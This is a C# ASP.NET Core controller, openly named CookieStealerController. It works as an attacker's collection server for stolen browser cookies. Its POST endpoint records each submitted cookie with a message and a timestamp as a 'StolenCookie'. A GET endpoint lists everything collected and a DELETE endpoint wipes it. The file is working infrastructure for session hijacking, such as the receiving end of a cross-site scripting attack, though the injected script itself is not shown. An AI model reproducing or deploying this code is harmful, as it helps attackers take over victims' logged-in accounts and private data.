using Microsoft.AspNetCore.Cors;
using Microsoft.AspNetCore.Mvc;

namespace CookieStealer.Controllers
{
    [ApiController]
    [Route("[controller]")]
    public class CookieStealerController : ControllerBase
    {

        [HttpGet]
        public IEnumerable<StolenCookie> Get()
        {
            return CookieRepository.Cookies;
        }

        [HttpPost]
        [DisableCors]
        public void Post(CookieMessage cookieMessage)
        {
            CookieRepository.Cookies.Add(new StolenCookie
            {
                Cookie = cookieMessage.Cookie,
                Message = cookieMessage.Message,
                Time = DateTime.Now
            });
        }

        [HttpDelete]
        public void Delete()
        {
            CookieRepository.Cookies.Clear();
        }
    }
}